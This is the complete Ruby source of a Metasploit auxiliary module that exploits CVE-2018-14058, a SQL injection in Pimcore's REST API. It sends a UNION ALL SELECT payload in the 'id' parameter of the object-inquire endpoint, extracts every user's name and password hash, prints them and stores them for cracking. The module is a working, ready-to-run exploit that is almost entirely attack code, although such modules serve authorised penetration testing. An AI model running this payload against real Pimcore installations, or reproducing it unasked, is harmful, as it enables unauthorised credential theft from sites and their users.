##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Pimcore Gather Credentials via SQL Injection',
      'Description'    => %q{
        This module extracts the usernames and hashed passwords of all users of
        the Pimcore web service by exploiting a SQL injection vulnerability in
        Pimcore's REST API.

        Pimcore begins to create password hashes by concatenating a user's
        username, the name of the application, and the user's password in the
        format USERNAME:pimcore:PASSWORD.

        The resulting string is then used to generate an MD5 hash, and then that
        MD5 hash is used to create the final hash, which is generated using
        PHP's built-in password_hash function.
      },
      'Author'         => [ 'Thongchai Silpavarangkura', # PoC
                            'N. Rai-Ngoen',              # PoC
                            'Shelby Pace'                # Metasploit Module
                          ],
      'License'        => MSF_LICENSE,
      'References'     => [
                            [ 'CVE', '2018-14058' ],
                            [ 'EDB', '45208' ]
                          ],
      'DisclosureDate' => 'Aug 13, 2018'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to pimcore', '/' ]),
        OptString.new('APIKEY', [ true, 'The valid API key for Pimcore REST API', '' ])
      ])
  end

  def available?
    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  normalize_uri(target_uri.path)
    )

    res && res.code == 200 && res.body.include?('pimcore')
  end

  def get_creds
    api_uri = normalize_uri(target_uri.path, "/webservice/rest/object-inquire")
    cmd = "#{rand(256)}) UNION ALL SELECT CONCAT(name,\" \",password) from users#"

    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  api_uri,
      'vars_get'  =>  {
        'apikey'  => datastore['APIKEY'],
        'id'      => cmd
      }
    )

    unless res
      fail_with(Failure::NotFound, 'The request returned no results.')
    end

    fail_with(Failure::NoAccess, 'API key is invalid') if res.body.include?('API request needs either a valid API key or a valid session.')

    format_results(res.get_json_document['data'])
  end

  def format_results(response)
    fail_with(Failure::NotFound, 'No data found') unless response
    creds = response.to_s.scan(/"([^\s]*)\s(\$[^(=>)]*)"/)
    fail_with(Failure::NotFound, 'Could not find any credentials') if creds.empty?

    print_good("Credentials obtained:")
    creds.each do |user, pass|
      print_good("#{user} : #{pass}")
      store_creds(user, pass)
    end
  end

  def store_creds(username, hash)
    store_valid_credential(
      user: username,
      private: hash,
      private_type: :nonreplayable_hash,
      service_data: {
        jtr_format: 'bcrypt',
        origin_type: :service,
        address: rhost,
        port: rport,
        service_name: 'mysql',
        protocol: 'tcp'
      }
    )
  end

  def run
    fail_with(Failure::NotFound, 'Could not access the Pimcore web page.') unless available?
    get_creds
  end
end
